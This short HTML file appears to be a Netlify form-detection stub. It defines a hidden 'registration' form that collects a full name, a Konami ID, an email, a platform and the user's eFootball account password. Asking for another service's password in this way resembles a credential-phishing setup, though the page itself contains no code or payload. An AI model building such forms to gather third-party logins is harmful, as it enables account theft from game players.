<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Netlify Forms Detection</title>
</head>
<body>
  <form name="registration" netlify data-netlify="true" method="POST" style="display:none">
    <input type="hidden" name="form-name" value="registration" />
    <input type="text" name="fullName" />
    <input type="text" name="konamiId" />
    <input type="password" name="efootballPassword" />
    <input type="email" name="email" />
    <select name="platform">
      <option value="mobile">Mobile</option>
    </select>
  </form>
</body>
</html>
